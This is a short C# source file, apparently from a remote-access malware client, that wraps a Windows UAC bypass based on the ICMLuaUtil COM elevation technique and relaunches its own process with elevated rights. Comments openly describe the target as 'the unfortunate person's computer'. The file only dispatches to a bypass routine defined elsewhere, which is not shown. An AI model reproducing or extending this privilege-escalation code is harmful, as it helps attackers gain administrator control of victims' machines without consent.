using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage.UAC
{
    /// <summary>
    /// Gets creative mode on the unfortunate person's computer.
    /// </summary>
    public enum UACMethods
    {
        /// <summary>
        /// The best bypass, ever, and the only bypass you'll ever need.
        /// </summary>
        ICMLuaUtil = 0,
    }
    public static class UAC_Bypass
    {
        public static bool QuickStart(string execpath, string args, UACMethods method)
        {
            switch (method)
            {
                case UACMethods.ICMLuaUtil:
                    return ucmCMLuaUtilShellExecMethod.BypassUAC(execpath, args);
            }
            return false;
        }
        public static bool QuickStart(UACMethods method)
        {
            return QuickStart(Constants.MyPath,
                Constants.MyProcessID.ToString() + " " + (int)method,
                method);
        }
    }
}
